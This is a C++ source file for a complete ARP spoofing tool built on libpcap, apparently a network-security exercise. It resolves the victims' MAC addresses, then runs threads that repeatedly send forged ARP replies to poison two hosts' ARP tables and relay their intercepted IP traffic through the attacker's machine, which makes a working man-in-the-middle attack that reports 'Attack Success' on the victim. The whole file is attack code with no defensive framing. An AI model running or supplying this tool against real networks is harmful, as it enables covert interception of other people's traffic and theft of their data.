#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

#include <fstream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#include <iostream>
#include <thread>
#include <vector>

#pragma pack(push, 1)

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

struct EthIpPacket final {
    EthHdr eth_;
    IpHdr ip_;
    char *data_;
};

#pragma pack(pop)

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

// https://stackoverflow.com/questions/17909401/linux-c-get-default-interfaces-ip-address
bool get_s_ip(char* dev, char* ip) {
    struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);

	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(s, SIOCGIFADDR, &ifr);

	close(s);

	Ip my_ip = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

	std::string str = std::string(my_ip);

	if (str.length() > 0) {
		strcpy(ip, str.c_str());
		return true;
	}
	
	return false;
}

bool get_s_mac(char* dev, char* mac) {
	std::string mac_addr;
	std::ifstream mac_file("/sys/class/net/" + std::string(dev) + "/address");
	std::string str((std::istreambuf_iterator<char>(mac_file)), std::istreambuf_iterator<char>());

	if (str.length() > 0) {
		strcpy(mac, str.c_str());
		return true;
	}
	
	return false;
}

bool find_mac_by_ip(pcap_t* handle, std::string sender_ip, std::string* d_mac, char* s_mac, std::string my_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(s_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(s_mac);
    packet.arp_.sip_ = htonl(Ip(my_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    for (int i = 0; i < 10; i++) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        res = pcap_next_ex(handle, &header, &packet);

        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthHdr* eth = (EthHdr*)packet;
        ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));

        std::string arp_sip = std::string(arp->sip());

        if (eth->type() == EthHdr::Arp && arp->op() == ArpHdr::Reply && arp_sip.compare(sender_ip) == 0) {
            *d_mac = std::string(arp->smac());
            return true;
        }
    }
    return false;
}

void change_arp_table(char* dev, std::string sender_ip, std::string sender_mac, std::string target_ip, std::string target_mac, std::string my_ip, char* s_mac) {
    char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}

    while(true) {
        std::string d_mac;
        EthArpPacket packet;

        packet.eth_.dmac_ = Mac(sender_mac);
        packet.eth_.smac_ = Mac(s_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = Mac(s_mac);
        packet.arp_.sip_ = htonl(Ip(target_ip));
        packet.arp_.tmac_ = Mac(sender_mac);
        packet.arp_.tip_ = htonl(Ip(sender_ip));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        else {
            printf("\033[0;31m");

            printf("Attack Success\n");
            printf("Change Victim(%s)'s ARP Table\n\n", sender_ip.c_str());

            printf("\033[0m");
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
    }

    pcap_close(handle);
}

void print_recv(EthHdr* eth, IpHdr* ip) {
    printf("\033[0;33m");

    printf("Recv Success\n");
    printf("[ETHERNET]\n");
    printf("src mac : %s\n", std::string(eth->smac()).c_str());
    printf("dst mac : %s\n\n", std::string(eth->dmac()).c_str());
    printf("[IP]\n");
    printf("src ip : %s\n", std::string(ip->sip()).c_str());
    printf("dst ip : %s\n\n", std::string(ip->dip()).c_str());

    printf("\033[0m");
}

void print_send(EthHdr* eth, IpHdr* ip) {
    printf("\033[0;32m");

    printf("Send Success\n");
    printf("[ETHERNET]\n");
    printf("src mac : %s\n", std::string(eth->smac()).c_str());
    printf("dst mac : %s\n\n", std::string(eth->dmac()).c_str());
    printf("[IP]\n");
    printf("src ip : %s\n", std::string(ip->sip()).c_str());
    printf("dst ip : %s\n\n", std::string(ip->dip()).c_str());

    printf("\033[0m");
}

void recv_and_reply(char* dev, std::string sender_ip, std::string sender_mac, std::string target_ip, std::string target_mac, std::string my_ip, char* s_mac) {
    int res;
    char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return;
        }

        EthHdr* eth = (EthHdr*)packet;

        if(eth->type() != EthHdr::Ip4) continue;

        IpHdr* ip = (IpHdr*)(packet + sizeof(EthHdr));

        std::string sip = std::string(ip->sip());
        std::string dip = std::string(ip->dip());

        eth->smac_ = Mac(s_mac);
        if (sip.compare(sender_ip) == 0) {
            eth->dmac_ = Mac(target_mac);
        }
        else if (dip.compare(sender_ip) == 0) {
            eth->dmac_ = Mac(sender_mac);
        }

        print_recv(eth, ip);

        res = pcap_sendpacket(handle, packet, header->caplen);

        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        else {
            print_send(eth, ip);
        }
    }

    pcap_close(handle);
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char s_ip[Ip::SIZE];
	if (get_s_ip(dev, s_ip)) {
		printf("My IP address: %s\n", s_ip);
	} else {
		printf("couldn't get IP address\n");
		return -1;
	}
	std::string my_ip = std::string(s_ip);

	char s_mac[Mac::SIZE];
	if (get_s_mac(dev, s_mac)) {
		printf("My MAC address: %s\n", s_mac);
	} else {
		printf("couldn't get MAC address\n");
		return -1;
	}

    std::vector<std::thread> threads;
	for(int i = 2; i < argc; i += 2) {
		std::string sender_ip = std::string(argv[i]);
		std::string target_ip = std::string(argv[i+1]);

        std::string sender_mac, target_mac;

        while(!find_mac_by_ip(handle, sender_ip, &sender_mac, s_mac, my_ip)) ;
        printf("\033[0;34m");
        printf("Sender MAC address: %s\n", sender_mac.c_str());
        printf("\033[0m");

        while(!find_mac_by_ip(handle, target_ip, &target_mac, s_mac, my_ip)) ;
        printf("\033[0;34m");
        printf("Target MAC address: %s\n\n", target_mac.c_str());
        printf("\033[0m");

        threads.push_back(std::thread(change_arp_table, dev, sender_ip, sender_mac, target_ip, target_mac, my_ip, s_mac));
        threads.push_back(std::thread(change_arp_table, dev, target_ip, target_mac, sender_ip, sender_mac, my_ip, s_mac));
        threads.push_back(std::thread(recv_and_reply, dev, sender_ip, sender_mac, target_ip, target_mac, my_ip, s_mac));
	}

    pcap_close(handle);

    for (auto& t : threads) {
        t.join();
    }
}